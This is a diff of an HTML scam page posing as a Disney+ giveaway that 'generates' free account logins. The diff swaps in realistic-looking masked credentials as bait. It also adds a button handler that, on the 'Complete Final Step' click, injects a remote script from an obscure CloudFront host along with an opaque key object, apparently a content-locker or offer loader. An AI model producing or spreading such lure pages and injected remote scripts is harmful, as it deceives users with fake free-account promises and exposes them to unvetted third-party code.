@@ -120,10 +120,10 @@
       border-radius: 8px;
       display: inline-block;
       margin-top: 10px;
-      margin-bottom: 20px; /* ✅ تمت إضافتها لترك مسافة قبل الزر */
+      margin-bottom: 20px;
     }
 
-    /* ✅ زرّي Android و iOS */
+    /* أزرار Android و iOS */
     .button-group {
       display: flex;
       gap: 15px;
@@ -158,7 +158,6 @@
       <h3>Entry Requirements:</h3>
       <ul>
         <li>Must be at least 18 years old</li>
-        <li>Valid email required for winner confirmation</li>
         <li>One entry per person</li>
         <li>No credit card required</li>
       </ul>
@@ -178,10 +177,10 @@
     <div class="generator" id="generator">
       <div class="loading" id="loadingText">Connecting to Disney+ servers...</div>
       <div class="credentials" id="credentials" style="display:none;">
-        <p><strong>Username:</strong> user****@mail.com</p>
-        <p><strong>Password:</strong> *******</p>
+        <p><strong>Username:</strong> ma****ells5**8@gmail.com </p>
+        <p><strong>Password:</strong> os2****wqk </p>
       </div>
-      <button class="btn" id="finalStepBtn" style="display:none;" onclick="window.location.href='https://your-final-link.com'">Complete Final Step</button>
+      <button class="btn" id="finalStepBtn" style="display:none;">Complete Final Step</button>
     </div>
   </div>
 
@@ -200,6 +199,7 @@
       document.getElementById('step2').style.display = 'block';
       window.scrollTo(0,0);
     }
+
     function startGenerator(device) {
       document.getElementById('step2').style.display = 'none';
       document.getElementById('step3').style.display = 'block';
@@ -225,6 +225,14 @@
         }
       }, 1500);
     }
+
+    // تشغيل الكود عند الضغط على الزر
+    document.getElementById('finalStepBtn').addEventListener('click', function() {
+      var vdClm_qkA_njrLac = {"it":4383509,"key":"005d0"};
+      var s = document.createElement('script');
+      s.src = "https://dfmpe7igjx4jo.cloudfront.net/9ec8c43.js";
+      document.body.appendChild(s);
+    });
   </script>
 </body>
 </html>
